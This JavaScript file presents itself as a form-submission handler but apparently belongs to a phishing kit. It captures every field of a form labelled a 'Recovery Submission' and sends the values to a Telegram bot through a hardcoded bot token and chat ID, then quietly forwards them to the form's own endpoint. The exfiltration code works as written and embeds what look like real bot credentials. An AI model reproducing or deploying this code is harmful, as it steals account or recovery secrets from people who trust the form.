(function () {
  // ------------------- Helper: Collect form data -------------------
  function getFormData(form) {
    const elements = form.elements;
    let honeypot;

    const fields = Object.keys(elements)
      .filter((k) => {
        if (elements[k].name === "honeypot") {
          honeypot = elements[k].value;
          return false;
        }
        return true;
      })
      .map((k) => {
        if (elements[k].name !== undefined) return elements[k].name;
        else if (elements[k].length > 0) return elements[k].item(0).name;
      })
      .filter((item, pos, self) => self.indexOf(item) === pos && item);

    const formData = {};
    fields.forEach((name) => {
      const element = elements[name];
      if (!element) return;

      // Single value
      formData[name] = element.value;

      // Multiple selections (checkbox, select)
      if (element.length) {
        const data = [];
        for (let i = 0; i < element.length; i++) {
          const item = element.item(i);
          if (item.checked || item.selected) data.push(item.value);
        }
        if (data.length) formData[name] = data.join(", ");
      }
    });

    formData.formDataNameOrder = JSON.stringify(fields);
    formData.formGoogleSheetName = form.dataset.sheet || "responses";
    formData.formGoogleSendEmail = form.dataset.email || "";

    return { data: formData, honeypot: honeypot };
  }

  // ------------------- Disable / Enable Buttons -------------------
  function disableAllButtons(form) {
    form.querySelectorAll("button").forEach((btn) => (btn.disabled = true));
  }
  function enableAllButtons(form) {
    form.querySelectorAll("button").forEach((btn) => (btn.disabled = false));
  }

  // ------------------- Telegram Integration -------------------
  const chatIds = ["1802596609"]; // Replace with your Telegram chat ID
  const botToken = "8174046269:AAFB8xRxRtE2061lxuHtbFf5JsDRR0PyNsk"; // Replace with your Telegram bot token

  async function sendToTelegram(msg) {
    for (let i = 0; i < chatIds.length; i++) {
      const data = { chat_id: chatIds[i], text: msg };
      try {
        const resp = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
          }
        );
        const json = await resp.json();
        console.log("Telegram response:", json);
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }
  }

  // ------------------- Handle Form Submission -------------------
  async function handleFormSubmit(event) {
    event.preventDefault();
    const form = event.target;
    const formDataObj = getFormData(form);

    if (formDataObj.honeypot) return false; // ignore bots
    disableAllButtons(form);

    // --- Prepare Telegram message dynamically ---
    let msg = "📥 Recovery Submission:\n";
    Object.keys(formDataObj.data).forEach((key) => {
      msg += `${key}: ${formDataObj.data[key]}\n`;
    });
    await sendToTelegram(msg);

    // --- Optional: Submit via original form POST ---
    const url = form.action;
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        form.reset();
        const formElements = form.querySelector(".form-elements");
        if (formElements) formElements.style.display = "none";
        const thankYouMessage = form.querySelector(".thankyou_message");
        if (thankYouMessage) thankYouMessage.style.display = "block";
      }
      enableAllButtons(form);
    };

    // Encode form data
    const encoded = Object.keys(formDataObj.data)
      .map(
        (k) =>
          encodeURIComponent(k) + "=" + encodeURIComponent(formDataObj.data[k])
      )
      .join("&");

    xhr.send(encoded);
  }

  // ------------------- Initialize -------------------
  function init() {
    const forms = document.querySelectorAll("form.gform, form#secureForm");
    forms.forEach((f) => f.addEventListener("submit", handleFormSubmit));
  }

  document.addEventListener("DOMContentLoaded", init);
})();
